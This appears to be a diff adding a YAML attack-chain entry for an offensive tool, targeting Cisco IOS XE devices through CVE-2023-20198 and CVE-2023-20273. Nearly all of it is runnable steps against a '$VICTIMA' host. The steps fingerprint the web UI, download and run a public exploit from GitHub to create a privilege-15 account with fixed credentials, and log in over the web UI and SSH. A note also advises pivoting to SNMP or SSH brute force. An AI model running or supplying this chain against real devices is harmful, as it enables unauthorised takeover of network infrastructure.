@@ -1,0 +1,69 @@
+chain_id: cisco_iosxe_cve_2023_20198
+title: "Cisco IOS XE — CVE-2023-20198 web UI auth bypass + CVE-2023-20273 priv-15 implant"
+severity: CRITICAL
+tags: [web, cisco, iosxe, cve-2023-20198, cve-2023-20273, auth-bypass, implant]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2023-20198" }
+    - { kind: "CVE-2023-20273" }
+    - { banner_pattern: "(?i)cisco.*ios\\s*xe|cisco.*c[0-9]+" }
+    - { product_pattern: "(?i)cisco\\s*ios\\s*xe" }
+    - { path_pattern: "(?i)/webui/(logoutconfirm|login)" }
+
+description: |
+  IOS XE 16.x/17.x with the HTTP/HTTPS web UI exposed: CVE-2023-20198
+  is an auth bypass that lets an unauth attacker create a local user
+  with privilege 15. Chained with CVE-2023-20273 (web UI command
+  injection) the attacker drops `cisco_service.conf` — a JS implant
+  that adds a backdoor account `cisco_tac_admin` / `cisco_support`.
+  Tens of thousands of devices owned in October 2023.
+
+steps:
+  - id: 1
+    title: "Fingerprint web UI exposure"
+    command: |
+      curl -sk -I "https://$VICTIMA/webui/" | head -10
+      curl -sk -i "https://$VICTIMA/webui/logoutconfirm.html?logon_hash=1"
+
+  - id: 2
+    title: "Detect existing implant (CISA hash check)"
+    command: |
+      curl -sk -X POST "https://$VICTIMA/webui/logoutconfirm.html?logon_hash=1" \
+        -H 'Content-Length: 0' -i
+      # If the implant is loaded, this returns an 18-char hex string.
+      curl -sk "https://$VICTIMA/%25" -I
+
+  - id: 3
+    title: "Public PoC — create admin account via the bypass"
+    command: |
+      git clone https://github.com/W01fh4cker/CVE-2023-20198-RCE /tmp/cve20198
+      python3 /tmp/cve20198/CVE-2023-20198.py -t https://$VICTIMA \
+        -u rootctl -p Rootctl123!
+
+  - id: 4
+    title: "Now log in via the web UI"
+    command: |
+      curl -sk -c /tmp/cisco.jar "https://$VICTIMA/webui/" \
+        -d 'username=rootctl&password=Rootctl123!'
+      curl -sk -b /tmp/cisco.jar "https://$VICTIMA/webui/" -I
+
+  - id: 5
+    title: "Or via SSH/console with the new creds"
+    command: |
+      ssh rootctl@$VICTIMA
+      # at the # prompt:
+      #   show running-config | include username
+      #   show platform integrity sign nonce 1234   ← detects implant tamper
+
+common_errors:
+  - error: "logoutconfirm endpoint returns 404"
+    solution: |
+      Web UI not enabled (good for the defender). Confirm with
+      `show running-config | include ip http`. If `no ip http server`,
+      the entry path is gone — pivot to SNMP or SSH brute.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2023-20198
+  - https://nvd.nist.gov/vuln/detail/CVE-2023-20273
+  - https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/
